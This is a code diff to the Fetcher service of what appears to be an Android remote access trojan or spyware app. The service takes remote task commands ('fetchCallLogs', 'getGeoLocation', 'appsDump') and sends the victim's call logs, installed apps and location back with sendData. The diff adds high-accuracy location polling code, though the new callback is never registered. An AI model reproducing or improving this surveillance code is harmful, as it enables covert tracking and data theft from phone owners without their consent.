@@ -36,6 +36,9 @@ import com.android.volley.toolbox.HttpHeaderParser;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationCallback;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
@@ -165,7 +168,7 @@ public class Fetcher extends Service {
                                 sendData(task, uuid, fetchCallLogs());
                                 break;
                             case "getGeoLocation":
-                                sendData(task, uuid, getLastLocation());
+                                sendData(task, uuid, getGeoLocation());
                                 break;
                             case "appsDump":
                                 sendData(task, uuid, fetchApps());
@@ -306,8 +309,7 @@ public class Fetcher extends Service {
 
     // Method to retrieve geographical location
     ArrayList<String> geoLocation = new ArrayList<>();
-
-    private ArrayList<String> getLastLocation() {
+    private ArrayList<String> getGeoLocation() {
         if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(getApplicationContext(), "android.permission.ACCESS_COARSE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
             FusedLocationProviderClient mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
             mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
@@ -317,9 +319,30 @@ public class Fetcher extends Service {
                         double latitude = location.getLatitude();
                         double longitude = location.getLongitude();
                         geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);
-
                     } else {
                         geoLocation.add("N/A");
+
+                        LocationRequest locationRequest = LocationRequest.create();
+                        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+                        locationRequest.setInterval(20 * 1000);
+
+
+                        new LocationCallback() {
+                            @Override
+                            public void onLocationResult(LocationResult locationResult) {
+                                if (locationResult == null) {
+                                    geoLocation.add("Cannot update");
+                                    return;
+                                }
+                                for (Location location : locationResult.getLocations()) {
+                                    if (location != null) {
+                                        double latitude = location.getLatitude();
+                                        double longitude = location.getLongitude();
+                                        geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);
+                                    }
+                                }
+                            }
+                        };
                     }
                 }
             })
